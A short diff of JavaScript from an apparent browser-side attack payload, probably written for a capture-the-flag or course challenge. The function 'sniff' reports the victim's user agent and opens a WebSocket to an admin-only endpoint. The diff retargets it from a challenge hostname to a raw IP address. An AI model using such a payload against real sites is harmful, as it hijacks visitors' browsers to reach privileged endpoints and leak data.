@@ -25,7 +25,7 @@ function sniff(){
   report("START_SNIF " + navigator.userAgent);
 
   try {
-    const ws_url = (location.protocol === "https:" ? "ws:" : "ws:") + "//" + "ce441-web.spchallenge.ir:8080" + "/admin/ws";
+    const ws_url = (location.protocol === "https:" ? "ws:" : "ws:") + "//" + "65.109.185.79:8080" + "/admin/ws";
     report("TRY_WS:" + ws_url);
     let ws = new WebSocket(ws_url);
     let received = "";
